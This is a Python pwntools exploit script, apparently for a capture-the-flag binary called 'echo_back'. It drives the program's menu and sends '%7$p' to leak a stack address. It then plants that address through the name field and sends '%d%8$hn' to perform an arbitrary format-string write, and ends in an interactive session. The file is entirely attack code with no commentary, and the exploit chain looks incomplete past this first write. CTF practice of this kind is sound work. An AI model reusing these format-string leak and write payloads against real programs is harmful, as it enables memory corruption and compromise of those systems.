# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')

p = process("./echo_back")
elf = ELF("./echo_back")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def echo(content):
    p.recvuntil("choice>> ")
    p.sendline("2")
    p.recvuntil("length:")
    p.sendline("7")
    p.sendline(content)

gdb.attach(p,"b * 0x555555554c50")
echo("%7$p")
p.recvuntil("anonymous say:")
addr = int(p.recv(14)[2:],16)
libcStack = addr + 0x18
log.success("libcstack:"+hex(libcStack))
p.recvuntil("choice>> ")
p.sendline("1")
p.recvuntil("name:")
p.sendline(p64(libcStack))

echo("%d%8$hn")



p.interactive()
